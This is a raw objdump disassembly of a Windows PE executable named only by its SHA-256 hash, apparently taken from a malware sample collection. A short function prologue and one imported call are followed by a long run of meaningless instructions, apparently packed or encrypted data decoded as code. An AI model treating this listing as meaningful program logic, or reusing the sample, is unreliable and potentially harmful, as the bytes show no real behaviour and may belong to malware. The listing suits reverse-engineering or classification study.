
83448cba6e41dc4bd6456c78c45c478418fddf157cbedb3133006e9379295375.exe:     file format pei-i386


Disassembly of section .text:

00401000 <.text>:
  401000:	push   ebp
  401001:	mov    ebp,esp
  401003:	sub    esp,0x70
  401006:	push   ebx
  401007:	mov    DWORD PTR [ebp-0x48],0x0
  40100e:	mov    DWORD PTR [ebp-0x18],0x0
  401015:	mov    DWORD PTR [ebp-0x70],0x0
  40101c:	mov    DWORD PTR [ebp-0x60],0x0
  401023:	mov    DWORD PTR [ebp-0x8],0x0
  40102a:	mov    DWORD PTR [ebp-0x6c],0x0
  401031:	mov    DWORD PTR [ebp-0x68],0x0
  401038:	mov    DWORD PTR [ebp-0x14],0x0
  40103f:	mov    DWORD PTR [ebp-0x4c],0x0
  401046:	mov    DWORD PTR [ebp-0x10],0x0
  40104d:	mov    DWORD PTR [ebp-0x58],0x0
  401054:	mov    DWORD PTR [ebp-0x4],0x0
  40105b:	mov    DWORD PTR [ebp-0x5c],0x0
  401062:	mov    DWORD PTR [ebp-0x30],0x0
  401069:	mov    DWORD PTR [ebp-0x54],0x0
  401070:	mov    DWORD PTR [ebp-0x2c],0x0
  401077:	mov    DWORD PTR [ebp-0x50],0x0
  40107e:	mov    DWORD PTR [ebp-0xc],0x0
  401085:	mov    eax,ds:0x449e08
  40108a:	mov    DWORD PTR [ebp-0x28],eax
  40108d:	mov    ecx,DWORD PTR ds:0x449e0c
  401093:	mov    DWORD PTR [ebp-0x24],ecx
  401096:	mov    edx,DWORD PTR ds:0x449e10
  40109c:	mov    DWORD PTR [ebp-0x20],edx
  40109f:	mov    al,ds:0x449e14
  4010a4:	mov    BYTE PTR [ebp-0x1c],al
  4010a7:	mov    ecx,DWORD PTR ds:0x449e18
  4010ad:	mov    DWORD PTR [ebp-0x40],ecx
  4010b0:	mov    edx,DWORD PTR ds:0x449e1c
  4010b6:	mov    DWORD PTR [ebp-0x3c],edx
  4010b9:	mov    eax,ds:0x449e20
  4010be:	mov    DWORD PTR [ebp-0x38],eax
  4010c1:	mov    cx,WORD PTR ds:0x449e24
  4010c8:	mov    WORD PTR [ebp-0x34],cx
  4010cc:	mov    dl,BYTE PTR ds:0x449e26
  4010d2:	mov    BYTE PTR [ebp-0x32],dl
  4010d5:	mov    DWORD PTR [ebp-0x30],0x40
  4010dc:	lea    eax,[ebp-0x40]
  4010df:	push   eax
  4010e0:	lea    ecx,[ebp-0x10]
  4010e3:	push   ecx
  4010e4:	call   DWORD PTR ds:0x418000
  4010ea:	test   eax,eax
  4010ec:	je     0x4167b5
  4010f2:	mov    edx,DWORD PTR [ebp-0x10]
  4010f5:	add    edx,0x1
  4010f8:	mov    DWORD PTR [ebp-0x10],edx
  4010fb:	inc    eax
  4010fc:	icebp  
  4010fd:	js     0x40116c
  4010ff:	add    al,0x37
  401101:	pop    ebx
  401102:	int    0xdd
  401104:	and    esi,DWORD PTR [edi]
  401106:	stos   BYTE PTR es:[edi],al
  401107:	dec    edi
  401108:	aad    0x55
  40110a:	xchg   ebp,eax
  40110b:	inc    esp
  40110c:	dec    edx
  40110d:	imul   ebp,DWORD PTR [ebx],0xffffff93
  401110:	dec    ebp
  401111:	jecxz  0x4010f7
  401113:	sahf   
  401114:	dec    ebp
  401115:	test   BYTE PTR ds:0x6ce35a29,0xb2
  40111c:	xor    dl,ch
  40111e:	xchg   esi,eax
  40111f:	inc    ecx
  401120:	out    0x4d,eax
  401122:	pop    ebx
  401123:	xlat   BYTE PTR ds:[ebx]
  401124:	pop    ecx
  401125:	adc    esi,DWORD PTR [esi]
  401127:	repz add bh,bh
  40112a:	rep ins BYTE PTR es:[edi],dx
  40112c:	fmul   QWORD PTR ds:0xd4e0c064
  401132:	cmp    eax,0x80cdf7ed
  401137:	dec    esp
  401138:	idiv   BYTE PTR [esi]
  40113a:	stos   DWORD PTR es:[edi],eax
  40113b:	add    ebx,DWORD PTR [ebp-0x42]
  40113e:	inc    eax
  40113f:	push   0x76
  401141:	stos   DWORD PTR es:[edi],eax
  401142:	sahf   
  401143:	cdq    
  401144:	nop
  401145:	jecxz  0x4010df
  401147:	(bad)  
  401148:	sub    BYTE PTR [eax],bl
  40114a:	fbld   TBYTE PTR [eax-0x7690c485]
  401150:	mov    cl,0x97
  401152:	aam    0xa5
  401154:	mov    al,ds:0xa23137d
  401159:	retf   0xd2e2
  40115c:	or     ch,BYTE PTR ds:0x76b43c9a
  401162:	dec    esi
  401163:	add    BYTE PTR [edi],ch
  401165:	mov    dh,0x7e
  401167:	inc    eax
  401168:	mov    ds:0x1709fa89,eax
  40116d:	ret    
  40116e:	mov    edi,0xf59de011
  401173:	fdivr  QWORD PTR [ebp-0x3375c524]
  401179:	(bad)  
  40117a:	test   eax,0x51a4ce4b
  40117f:	nop
  401180:	add    bl,ah
  401182:	adc    esi,esp
  401184:	and    ebx,DWORD PTR [ecx+0x4]
  401187:	mov    ebx,0xb740feff
  40118c:	mov    ds:0xbfe5c412,al
  401191:	mov    DWORD PTR cs:[edi],0xc758aff2
  401198:	add    eax,0x6f82811b
  40119d:	and    al,0xb0
  40119f:	add    DWORD PTR [eax+0x50],ebx
  4011a2:	cwde   
  4011a3:	add    DWORD PTR [esi-0x186dfc9],0x4
  4011aa:	in     eax,dx
  4011ab:	jge    0x401169
  4011ad:	gs pushf 
  4011af:	sbb    BYTE PTR [eax+eiz*4+0x6199e639],cl
  4011b6:	cmp    edx,esp
  4011b8:	aas    
  4011b9:	sbb    eax,0x7a5d1801
  4011be:	(bad)  
  4011bf:	ss jns 0x401168
  4011c2:	inc    esi
  4011c3:	adc    eax,0x9879a739
  4011c8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4011c9:	ret    
  4011ca:	pop    edx
  4011cb:	lahf   
  4011cc:	outs   dx,BYTE PTR ds:[esi]
  4011cd:	pop    ds
  4011ce:	out    dx,al
  4011cf:	pushf  
  4011d0:	pop    ds
  4011d1:	mov    ch,0xc2
  4011d3:	dec    edi
  4011d4:	addr16 jae 0x401247
  4011d7:	imul   esp,DWORD PTR [edx+esi*1-0x1a],0xffffffd9
  4011dc:	inc    esi
  4011dd:	adc    dl,ch
  4011df:	dec    ebx
  4011e0:	arpl   WORD PTR [edi+0x3413cf75],si
  4011e6:	xor    al,ah
  4011e8:	(bad)  
  4011e9:	arpl   WORD PTR ds:0x54e1a24b,si
  4011ef:	dec    edi
  4011f0:	and    BYTE PTR [esi+ecx*4+0x58],dl
  4011f4:	rcr    BYTE PTR [esi],1
  4011f6:	stc    
  4011f7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4011f8:	sub    dh,BYTE PTR [ecx-0x36d64052]
  4011fe:	xchg   edx,eax
  4011ff:	sub    ebp,DWORD PTR [ebx-0x56]
  401202:	cwde   
  401203:	repnz mov ebx,0x2003de7b
  401209:	je     0x401194
  40120b:	jge    0x4011f8
  40120d:	stc    
  40120e:	add    al,0x73
  401210:	daa    
  401211:	mov    WORD PTR [ebx+0x1c],es
  401214:	jnp    0x4011d1
  401216:	mov    ah,0x12
  401218:	xor    DWORD PTR [ebx-0x14],ebp
  40121b:	das    
  40121c:	xchg   esi,eax
  40121d:	push   cs
  40121e:	ss clc 
  401220:	jmp    0x4011e7
  401222:	fsubp  st(1),st
  401224:	sub    al,0x57
  401226:	xchg   edi,eax
  401227:	leave  
  401228:	in     eax,dx
  401229:	xor    DWORD PTR [edi],0x75db57c4
  40122f:	jle    0x4011cb
  401231:	mov    ebp,ebx
  401233:	leave  
  401234:	jp     0x4011c1
  401236:	jmp    0x9b00:0x9020fad9
  40123d:	(bad)  
  40123e:	jmp    0x40122b
  401240:	test   BYTE PTR [esi],bl
  401242:	ficom  DWORD PTR [ebp+0x75]
  401245:	and    BYTE PTR [ebp+0x42a48e8b],bl
  40124b:	in     eax,dx
  40124c:	daa    
  40124d:	retf   0x22c9
  401250:	stos   DWORD PTR es:[edi],eax
  401251:	jbe    0x401251
  401253:	mov    bh,0xd5
  401255:	pop    es
  401256:	jbe    0x40127a
  401258:	xchg   BYTE PTR [ebx+eax*2],bh
  40125b:	and    BYTE PTR [esp+ebx*8],bh
  40125e:	ins    DWORD PTR es:[edi],dx
  40125f:	pop    ds
  401260:	xor    DWORD PTR [edi-0x6f3eb869],ebp
  401266:	iret   
  401267:	test   al,0x9e
  401269:	pop    ebp
  40126a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40126b:	ja     0x40127e
  40126d:	push   edi
  40126e:	and    ebx,edi
  401270:	lea    ebp,[ecx-0xee6c767]
  401276:	ss mov ecx,0x7ceaae8
  40127c:	pop    ebx
  40127d:	mov    ebx,0xd637bea1
  401282:	test   BYTE PTR [ebx],al
  401284:	(bad)  [edi]
  401286:	mov    dl,0x63
  401288:	aaa    
  401289:	sbb    BYTE PTR [ebx-0x15],dh
  40128c:	jns    0x4012f7
  40128e:	out    0xd,eax
  401290:	(bad)  
  401291:	addr16 std 
  401293:	mov    ebp,0xd49e3d13
  401298:	pop    edx
  401299:	sti    
  40129a:	mov    ds:0x754408b9,al
  40129f:	xchg   ecx,eax
  4012a0:	cmp    eax,0xc4283199
  4012a5:	push   DWORD PTR cs:[edx-0x69]
  4012a9:	jmp    0xd1bf068
  4012ae:	iret   
  4012af:	pop    esp
  4012b0:	inc    BYTE PTR ds:0x9d6cf81b
  4012b6:	call   0xbe542d54
  4012bb:	jb     0x4012ef
  4012bd:	dec    eax
  4012be:	inc    esi
  4012bf:	push   edx
  4012c0:	dec    ebp
  4012c1:	mov    cl,0xfd
  4012c3:	mov    ecx,0xa777f381
  4012c8:	dec    eax
  4012c9:	push   ecx
  4012ca:	retf   0x6707
  4012cd:	lock fidiv WORD PTR [ecx-0xede6021]
  4012d4:	push   ds
  4012d5:	pop    ds
  4012d6:	aaa    
  4012d7:	cmp    edx,DWORD PTR [esi]
  4012d9:	arpl   WORD PTR [esi+0x26],di
  4012dc:	xchg   BYTE PTR [ecx],dl
  4012de:	adc    BYTE PTR ds:0xc1ca26fe,cl
  4012e4:	add    cl,BYTE PTR [esi+ecx*2]
  4012e7:	add    dh,BYTE PTR [esi]
  4012e9:	mov    edx,0xb265949f
  4012ee:	mov    ecx,0xd8d6625c
  4012f3:	pop    ebx
  4012f4:	xchg   esi,eax
  4012f5:	push   0x63a7197c
  4012fa:	jno    0x4012a7
  4012fc:	enter  0xd3a9,0x52
  401300:	mov    WORD PTR [esi],cs
  401302:	cmp    eax,0xd8e1375c
  401307:	sbb    DWORD PTR ds:0xded62375,ebx
  40130d:	cmc    
  40130e:	inc    DWORD PTR [edx]
  401310:	mov    ds:0xa0358845,al
  401315:	push   eax
  401316:	jp     0x40137a
  401318:	inc    esi
  401319:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40131a:	cmp    bh,ch
  40131c:	add    DWORD PTR [eax+0x70],edi
  40131f:	test   eax,0x72122b7b
  401324:	out    dx,eax
  401325:	xchg   DWORD PTR ds:0xb9f47e00,esi
  40132b:	rcr    ebp,1
  40132d:	outs   dx,BYTE PTR ds:[esi]
  40132e:	xchg   ebx,eax
  40132f:	and    dl,al
  401331:	fmul   DWORD PTR [esi]
  401333:	jo     0x401348
  401335:	adc    ah,BYTE PTR [edi]
  401337:	add    BYTE PTR [ebp-0x27],bh
  40133a:	pushf  
  40133b:	lods   al,BYTE PTR ds:[esi]
  40133c:	mov    bh,0x6f
  40133e:	mov    WORD PTR [esi],gs
  401340:	out    dx,eax
  401341:	int    0x52
  401343:	mov    edx,0x2a7b26a
  401348:	xchg   BYTE PTR ds:0x24f94050,dh
  40134e:	mov    al,ds:0x5d8f46f6
  401353:	mov    ah,0xde
  401355:	jmp    0x401336
  401357:	cwde   
  401358:	jl     0x401321
  40135a:	cld    
  40135b:	lea    edi,[esi]
  40135d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40135e:	out    dx,eax
  40135f:	cmp    BYTE PTR [eax],bh
  401361:	(bad)  
  401362:	clc    
  401363:	aad    0xb8
  401365:	adc    ch,al
  401367:	cmp    eax,0x3428c179
  40136c:	or     DWORD PTR [esi+0x19d292e9],0x79
  401373:	jmp    0x60d7799c
  401378:	mov    bl,0xc3
  40137a:	cmp    ch,0x58
  40137d:	js     0x401375
  40137f:	ret    
  401380:	ins    DWORD PTR es:[edi],dx
  401381:	and    BYTE PTR [ebp-0x637d8649],al
  401387:	push   0x3b
  401389:	repz xchg edi,eax
  40138b:	xor    al,0xa0
  40138d:	mov    es,esi
  40138f:	xlat   BYTE PTR ds:[ebx]
  401390:	fst    DWORD PTR [edi+esi*2-0x1c]
  401394:	jge    0x401325
  401396:	xchg   edx,eax
  401397:	inc    esi
  401398:	neg    DWORD PTR [esp+eax*8]
  40139b:	pop    es
  40139c:	inc    esi
  40139d:	hlt    
  40139e:	lods   eax,DWORD PTR ds:[esi]
  40139f:	push   eax
  4013a0:	fld    QWORD PTR [edx+0x3d2a0667]
  4013a6:	xor    eax,0x87c7aa11
  4013ab:	inc    ecx
  4013ac:	repz push 0x31830fa3
  4013b2:	add    eax,0xf1d2ae4d
  4013b7:	mov    ah,0xdc
  4013b9:	xlat   BYTE PTR ds:[ebx]
  4013ba:	popf   
  4013bb:	jbe    0x4013d7
  4013bd:	arpl   WORD PTR [eax+0x7],ax
  4013c0:	aam    0x60
  4013c2:	xor    bh,BYTE PTR ds:0xc4e32ca4
  4013c8:	pushf  
  4013c9:	dec    edx
  4013ca:	scas   al,BYTE PTR es:[edi]
  4013cb:	imul   ebx,DWORD PTR [eax-0x1d],0x21bea630
  4013d2:	sub    al,0x97
  4013d4:	mov    ebp,DWORD PTR [ebx+ebx*1+0x67a6676e]
  4013db:	push   ebx
  4013dc:	fld    DWORD PTR [eax-0x62]
  4013df:	mov    edx,0x901c674a
  4013e4:	push   cs
  4013e5:	out    dx,eax
  4013e6:	mov    al,ds:0xaf0e2676
  4013eb:	xor    DWORD PTR ds:0xafb61bd0,ebp
  4013f1:	ja     0x401383
  4013f3:	sbb    ebp,esi
  4013f5:	in     eax,dx
  4013f6:	xor    bh,dh
  4013f8:	mov    edi,0x70ddaab8
  4013fd:	push   eax
  4013fe:	cs dec edx
  401400:	jnp    0x40142a
  401402:	xor    DWORD PTR ds:0x17b4c9d,esi
  401408:	sub    DWORD PTR [edx],edi
  40140a:	cs jns 0x401458
  40140d:	dec    eax
  40140e:	retf   
  40140f:	mov    BYTE PTR [eax-0x77984948],al
  401415:	mov    esi,0x8cd41596
  40141a:	pop    es
  40141b:	ret    
  40141c:	lds    ecx,FWORD PTR [ebx+0x48]
  40141f:	mov    dh,cl
  401421:	or     bl,BYTE PTR [ecx+ebp*4+0x1e]
  401425:	iret   
  401426:	sub    eax,ebp
  401428:	or     al,0xba
  40142a:	test   eax,0x6a1d6023
  40142f:	fisttp QWORD PTR [edi-0x4a338e02]
  401435:	mov    al,0x6b
  401437:	push   DWORD PTR [ebx]
  401439:	test   BYTE PTR [eax],0x3e
  40143c:	loopne 0x401465
  40143e:	test   eax,0x44b8c4dc
  401443:	jle    0x401476
  401445:	add    al,0x95
  401447:	in     eax,0xcb
  401449:	push   ss
  40144a:	fwait
  40144b:	jecxz  0x4014c2
  40144d:	sbb    eax,0xc21c4832
  401452:	adc    esi,edx
  401454:	shr    BYTE PTR [edi],1
  401456:	fst    QWORD PTR [ebx+0x5a]
  401459:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40145a:	or     ebp,edx
  40145c:	or     bh,ah
  40145e:	jb     0x4014dd
  401460:	fstp   TBYTE PTR [ebx-0x78084dd5]
  401466:	mov    edx,0x6f12620b
  40146b:	arpl   WORD PTR [ebp+0x3c8283f5],di
  401471:	sar    BYTE PTR ds:0xe3ee514a,1
  401477:	mov    esi,0xa567f94a
  40147c:	push   ds
  40147d:	or     ch,BYTE PTR [edx-0x80]
  401480:	inc    edi
  401481:	push   ecx
  401482:	sbb    eax,0xce87aa39
  401487:	mov    ch,0x16
  401489:	sbb    BYTE PTR [esi+0x28],al
  40148c:	ja     0x4014a8
  40148e:	jno    0x4014c8
  401490:	push   edi
  401491:	xchg   ecx,eax
  401492:	mov    al,ds:0x6d30633c
  401497:	test   BYTE PTR [edi+0x32981fcc],0x9e
  40149e:	mov    al,BYTE PTR ds:0xfb443ec7
  4014a4:	icebp  
  4014a5:	mov    edi,0x457960f4
  4014aa:	mov    ecx,0xb1da5e5b
  4014af:	or     BYTE PTR [edx+0x5bdf3968],al
  4014b5:	mov    eax,ds:0xfc155b30
  4014ba:	cmp    DWORD PTR [ebx+ebp*2+0x79],esi
  4014be:	ds sbb eax,0xc9c49312
  4014c4:	mov    edi,0x540cafce
  4014c9:	jae    0x401481
  4014cb:	inc    eax
  4014cc:	ins    DWORD PTR es:[edi],dx
  4014cd:	jb     0x40148d
  4014cf:	retf   
  4014d0:	and    DWORD PTR [ecx+0x4c846a63],0x59
  4014d7:	jnp    0x4014cb
  4014d9:	mov    BYTE PTR [eax+0x73b3c9ea],dl
  4014df:	mov    eax,ds:0xf9c06645
  4014e4:	rcl    BYTE PTR [esi+0x71],1
  4014e7:	or     eax,0x16a5af1a
  4014ec:	cmp    bh,ch
  4014ee:	and    ah,bl
  4014f0:	shl    DWORD PTR [edx-0x65],1
  4014f3:	jnp    0x401496
  4014f5:	cmp    edi,DWORD PTR [ebx-0x1e0ce550]
  4014fb:	lahf   
  4014fc:	pop    edx
  4014fd:	ds inc eax
  4014ff:	cdq    
  401500:	jmp    0x1db65bdf
  401505:	jbe    0x401558
  401507:	out    0x29,eax
  401509:	mov    esi,0xb0049e2
  40150e:	push   esp
  40150f:	jmp    0x401501
  401511:	enter  0x26d4,0xeb
  401515:	ja     0x40149d
  401517:	xor    eax,0x81cccdc6
  40151c:	adc    edi,eax
  40151e:	sub    eax,0xdd3290df
  401523:	mov    dl,0x5
  401525:	(bad)
  401528:	(bad)  
  40152a:	dec    edx
  40152b:	jl     0x4014e2
  40152d:	jg     0x401525
  40152f:	out    0x95,al
  401531:	add    eax,0x7533af07
  401536:	jo     0x4015ab
  401538:	dec    ecx
  401539:	scas   eax,DWORD PTR es:[edi]
  40153a:	test   DWORD PTR [ecx+0x42],0x2af9611a
  401541:	mov    eax,0x5d31ef9e
  401546:	and    BYTE PTR [ecx-0x2728b3e2],dh
  40154c:	shl    DWORD PTR [edi-0x32],cl
  40154f:	push   edi
  401550:	adc    DWORD PTR [esi+0xf],ecx
  401553:	pop    ecx
  401554:	mov    ah,0x1d
  401556:	mov    ds:0x81b1472c,eax
  40155b:	mov    ch,0x52
  40155d:	test   eax,0xe45d078c
  401562:	cmp    esi,DWORD PTR [edx]
  401564:	pop    ecx
  401565:	out    0x67,al
  401567:	jge    0x4015b7
  401569:	gs out 0xb5,eax
  40156c:	sub    al,0xa8
  40156e:	push   ebx
  40156f:	out    dx,al
  401570:	xchg   ebp,eax
  401571:	push   0x387c4160
  401576:	inc    ebp
  401577:	fstp   QWORD PTR [edi+esi*1]
  40157a:	jns    0x40159a
  40157c:	arpl   WORD PTR [esi],cx
  40157e:	shl    DWORD PTR [ebx-0x4b],0xa4
  401582:	adc    BYTE PTR [edi],cl
  401584:	and    al,0xd4
  401586:	fcom   QWORD PTR [eax-0x456f136]
  40158c:	mov    WORD PTR [ebx],?
  40158e:	mov    bh,0xcd
  401590:	sbb    ebp,DWORD PTR [ebx-0x5]
  401593:	inc    ebx
  401594:	mov    eax,0xd9890475
  401599:	inc    edi
  40159a:	sub    DWORD PTR [ebx-0x31],esi
  40159d:	cmp    dh,BYTE PTR [edx+0x2a]
  4015a0:	cwde   
  4015a1:	les    ebp,FWORD PTR [edi+0x23]
  4015a4:	adc    DWORD PTR [edx-0x4b],0x23
  4015a8:	test   ax,0x81e5
  4015ac:	push   es
  4015ad:	dec    DWORD PTR [ecx+edi*4-0x487f810a]
  4015b4:	mov    cl,0x97
  4015b6:	jg     0x4015c3
  4015b8:	jp     0x40160f
  4015ba:	lahf   
  4015bb:	lods   al,BYTE PTR ds:[esi]
  4015bc:	mov    eax,0xb25440cb
  4015c1:	fwait
  4015c2:	cmp    BYTE PTR [eax+0x3a],bh
  4015c5:	fstp   st(1)
  4015c7:	call   0xa2b2:0x520c03bb
  4015ce:	out    0x85,al
  4015d0:	icebp  
  4015d1:	adc    DWORD PTR ds:0xdb449ebd,edx
  4015d7:	xor    eax,0x7b709e8
  4015dc:	cmp    eax,0x25df4ccf
  4015e1:	pop    edi
  4015e2:	shl    BYTE PTR [edi+0x62],cl
  4015e5:	xchg   esp,eax
  4015e6:	sbb    eax,esi
  4015e8:	scas   eax,DWORD PTR es:[edi]
  4015e9:	icebp  
  4015ea:	mov    bl,0xd9
  4015ec:	mov    ds:0xaf9b7a2d,al
  4015f1:	or     al,0x83
  4015f3:	mov    ebp,edi
  4015f5:	arpl   WORD PTR [edi-0xc],cx
  4015f8:	ja     0x40161d
  4015fa:	imul   esi,DWORD PTR [esi+0x1d],0x58
  4015fe:	out    dx,al
  4015ff:	test   DWORD PTR fs:[eax-0x18],esi
  401603:	aas    
  401604:	shl    DWORD PTR [ebx],cl
  401606:	or     DWORD PTR [ebx+0x3e],eax
  401609:	or     BYTE PTR [ecx-0x80],al
  40160c:	push   0x55
  40160e:	add    BYTE PTR [edi],cl
  401610:	fxch   st(4)
  401612:	push   0xffffffc8
  401614:	lea    ebx,[ecx+0x62]
  401617:	cmp    BYTE PTR [edx+0x718bfaf0],dh
  40161d:	shr    DWORD PTR [ebp+0xeec734c],cl
  401623:	ins    BYTE PTR es:[edi],dx
  401624:	ror    eax,1
  401626:	test   al,0x4a
  401628:	rcl    esp,0x65
  40162b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40162c:	je     0x4015e5
  40162e:	pop    ebp
  40162f:	cwde   
  401630:	push   eax
  401631:	adc    BYTE PTR [edx-0x33],cl
  401634:	jae    0x40162f
  401636:	loopne 0x40168b
  401638:	inc    esp
  401639:	or     al,0xc6
  40163b:	lods   eax,DWORD PTR ds:[esi]
  40163c:	pop    ecx
  40163d:	cmp    dl,ch
  40163f:	jl     0x401672
  401641:	sub    cl,BYTE PTR [edi+0x71]
  401644:	(bad)  
  401646:	call   0x2d1b:0x32de2ce6
  40164d:	push   edi
  40164e:	jns    0x401636
  401650:	mov    DWORD PTR [esi+0x5d],ebx
  401653:	mov    ebp,0xf12f8f0d
  401658:	sbb    BYTE PTR ds:0xeb7d676d,bl
  40165e:	ja     0x4015e4
  401660:	lods   al,BYTE PTR ds:[esi]
  401661:	lock stos BYTE PTR es:[edi],al
  401663:	jae    0x401668
  401665:	std    
  401666:	cmp    DWORD PTR [ebp+0x4c963422],esi
  40166c:	imul   esi,DWORD PTR [esi],0xe23b746c
  401672:	mov    esi,0x76b9bff8
  401677:	sbb    ch,ch
  401679:	inc    edx
  40167a:	mov    BYTE PTR [edi-0x2f],0x1a
  40167e:	sar    BYTE PTR [ebx],0xaf
  401681:	jmp    ecx
  401683:	call   0xcd285264
  401688:	mov    ah,0xa6
  40168a:	ficomp DWORD PTR [esi+edx*1+0x59]
  40168e:	in     al,dx
  40168f:	sbb    DWORD PTR [ebx],esi
  401691:	adc    esp,ecx
  401693:	cli    
  401694:	hlt    
  401695:	frstor [edi+0x5d]
  401698:	mov    esp,0x53853d2
  40169d:	push   esi
  40169e:	sahf   
  40169f:	xchg   BYTE PTR [edx-0x5b],ah
  4016a2:	fidiv  WORD PTR [ecx-0x44a14627]
  4016a8:	popf   
  4016a9:	ret    0xc942
  4016ac:	mov    dl,0xf9
  4016ae:	int3   
  4016af:	xchg   esi,eax
  4016b0:	jge    0x401640
  4016b2:	sbb    DWORD PTR [eax-0xc327b05],ebx
  4016b8:	or     eax,0x22c3a396
  4016bd:	or     BYTE PTR [edx+0x7],ah
  4016c0:	sbb    cl,BYTE PTR [esi+ebp*4+0x41]
  4016c4:	mov    BYTE PTR [edx],al
  4016c6:	add    bl,dh
  4016c8:	xor    eax,DWORD PTR [esi*2-0x7263f79e]
  4016cf:	test   al,0x5d
  4016d1:	js     0x401743
  4016d3:	dec    ebx
  4016d4:	(bad)  [ecx+edx*2+0x2dffd63a]
  4016db:	aam    0x33
  4016dd:	shl    BYTE PTR [eax],0x63
  4016e0:	retf   
  4016e1:	push   ss
  4016e2:	mov    ecx,DWORD PTR [ebx-0x3c52fd62]
  4016e8:	fistp  DWORD PTR [eax+0x5d71a23d]
  4016ee:	xor    dh,BYTE PTR [ebx+eiz*1+0x45]
  4016f2:	fs cld 
  4016f4:	xchg   BYTE PTR [eax],bl
  4016f6:	jp     0x401728
  4016f8:	fisttp QWORD PTR [edi+0x34]
  4016fb:	retf   0xaca5
  4016fe:	arpl   WORD PTR [ebp-0x1f78d4cc],sp
  401704:	add    DWORD PTR ds:0xf68633a1,edx
  40170a:	and    bl,ch
  40170c:	xchg   ebp,eax
  40170d:	fldenv [ebx-0x51]
  401710:	pop    es
  401711:	ret    0xee3
  401714:	or     BYTE PTR [esi+0x50],al
  401717:	xlat   BYTE PTR ds:[ebx]
  401718:	out    dx,eax
  401719:	lahf   
  40171a:	cmp    al,0x2a
  40171c:	jmp    0x4016f2
  40171e:	mov    bh,0x77
  401720:	inc    ecx
  401721:	pop    ds
  401722:	mov    DWORD PTR [edx],eax
  401724:	repz add dl,dh
  401727:	and    eax,0x91d7039
  40172c:	les    eax,FWORD PTR [edx+0x46]
  40172f:	mov    ecx,0xcad30e86
  401734:	cs jge 0x4016d1
  401737:	pop    ds
  401738:	xchg   ebp,eax
  401739:	dec    ebp
  40173a:	lods   al,BYTE PTR ds:[esi]
  40173b:	ja     0x4016d0
  40173d:	or     BYTE PTR [esi-0xf6649db],dh
  401743:	mov    edx,0x16ec41b3
  401748:	mov    ?,WORD PTR [ecx+0x77]
  40174b:	aad    0xba
  40174d:	ror    BYTE PTR [ebx-0x39],0x4e
  401751:	ins    BYTE PTR es:[edi],dx
  401752:	mov    edi,ebp
  401754:	jmp    0x40175f
  401756:	pop    ds
  401757:	shl    BYTE PTR [ebp+0x5a11efc8],0x6a
  40175e:	pop    ebx
  40175f:	jnp    0x401733
  401761:	xor    cl,BYTE PTR [ebx]
  401763:	and    al,0xfb
  401765:	add    al,0x77
  401767:	cmp    DWORD PTR [ebx-0x2f],edx
  40176a:	mov    ah,BYTE PTR [esi]
  40176c:	and    ch,BYTE PTR [ebp-0x4e]
  40176f:	push   es
  401770:	pushf  
  401771:	scas   eax,DWORD PTR es:[edi]
  401772:	fdivr  DWORD PTR [ecx]
  401774:	leave  
  401775:	aaa    
  401776:	fs mov ah,0x49
  401779:	push   ebx
  40177a:	xchg   DWORD PTR [esi],esp
  40177c:	sar    DWORD PTR [ecx+0x453d9f60],0xde
  401783:	dec    eax
  401784:	(bad)  [edi+0x58]
  401787:	push   ebp
  401788:	dec    ecx
  401789:	jmp    0x5a4c646f
  40178e:	jae    0x401769
  401790:	jp     0x401750
  401792:	imul   eax,DWORD PTR [eax+0x4a32d3a7],0x36
  401799:	mov    ecx,0xd199783b
  40179e:	ins    DWORD PTR es:[edi],dx
  40179f:	push   esi
  4017a0:	xchg   DWORD PTR [ecx-0x194ac9fc],esi
  4017a6:	lea    eax,[edi+0x18]
  4017a9:	test   eax,0xe1a661de
  4017ae:	adc    BYTE PTR [eax-0x4371412c],0xce
  4017b5:	mov    BYTE PTR [ecx+0x396ed641],al
  4017bb:	fistp  QWORD PTR [eax-0x25]
  4017be:	cdq    
  4017bf:	lods   eax,DWORD PTR ds:[esi]
  4017c0:	into   
  4017c1:	or     ecx,DWORD PTR [ecx]
  4017c3:	iret   
  4017c4:	mov    BYTE PTR [edi-0x48],dh
  4017c7:	enter  0x6d96,0xa4
  4017cb:	in     eax,0x55
  4017cd:	in     eax,dx
  4017ce:	sub    cl,BYTE PTR [ecx]
  4017d0:	jmp    0x26349de
  4017d5:	dec    esp
  4017d6:	mov    BYTE PTR [eax-0x13edad99],cl
  4017dc:	out    dx,al
  4017dd:	or     al,0x71
  4017df:	not    BYTE PTR [edi+0x493dab4e]
  4017e5:	add    esp,ebp
  4017e7:	je     0x401800
  4017e9:	inc    eax
  4017ea:	loopne 0x40185e
  4017ec:	inc    ecx
  4017ed:	call   0x9590:0xc1f42b1d
  4017f4:	mov    ah,0xf2
  4017f6:	xor    DWORD PTR [esi-0x1a],eax
  4017f9:	and    eax,0x886b92ce
  4017fe:	xchg   ecx,eax
  4017ff:	aas    
  401800:	inc    edi
  401801:	mov    ds:0x99a5b335,al
  401806:	xor    ebx,DWORD PTR [esi+0x33]
  401809:	xor    DWORD PTR [esi],0x4b3921a8
  40180f:	fwait
  401810:	sahf   
  401811:	mov    ?,WORD PTR [esi+eax*1-0x35e6f796]
  401818:	mov    cl,0x8e
  40181a:	mov    esp,0xf1498e6c
  40181f:	pop    esp
  401820:	cmc    
  401821:	xor    eax,0x3e4f209f
  401826:	ja     0x401856
  401828:	adc    ch,BYTE PTR [ebx]
  40182a:	(bad)  
  40182b:	jo     0x4017c6
  40182d:	loop   0x40184a
  40182f:	xchg   ebx,eax
  401830:	lea    ecx,[esi-0x356c16e8]
  401836:	push   esi
  401837:	not    BYTE PTR [edx+esi*8+0x33b60e21]
  40183e:	pusha  
  40183f:	jne    0x401876
  401841:	dec    esp
  401842:	shr    cl,1
  401844:	xchg   esi,eax
  401845:	pop    es
  401846:	imul   edi,DWORD PTR [ebp-0x15ed1723],0x5858beb2
  401850:	push   ds
  401851:	pop    ecx
  401852:	mov    esp,0xba46e7dc
  401857:	(bad)  
  401858:	mov    eax,0x2738c1dd
  40185d:	mov    esp,0x384b0f5e
  401862:	daa    
  401863:	mov    edi,0x3eb46e6b
  401868:	sub    al,0xaf
  40186a:	and    BYTE PTR [esi+0x30],cl
